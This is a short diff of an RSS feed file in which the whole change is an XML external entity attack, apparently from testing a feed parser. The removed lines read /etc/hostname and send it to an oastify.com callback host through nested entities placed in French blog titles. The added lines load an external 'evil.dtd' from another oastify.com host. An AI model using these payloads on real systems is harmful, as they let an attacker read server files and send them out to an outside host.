@@ -1,19 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-<!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY xxe "<!ENTITY &#x25; eval SYSTEM 'http://p7x9ql7byg8tweko6g2e7d4k1b72vujj.oastify.com/?x=%file;'>">
-%eval;
-]>
+<!DOCTYPE foo SYSTEM "http://3aentzap1ub7zsn29u5sar7y4pagy9my.oastify.com/evil.dtd">
 <rss version="2.0">
 <channel>
-    <title>&xxe;</title>
-    <link>http://www.monblog.com</link>
-    <description>Les derniers articles</description>
-    <item>
-        <title>&xxe;</title>
-        <link>http://www.monblog.com/article1</link>
-        <description>Résumé de l'article 1</description>
-        <pubDate>Mon, 05 May 2026 10:00:00 GMT</pubDate>
-    </item>
+  <title>test</title>
 </channel>
 </rss>
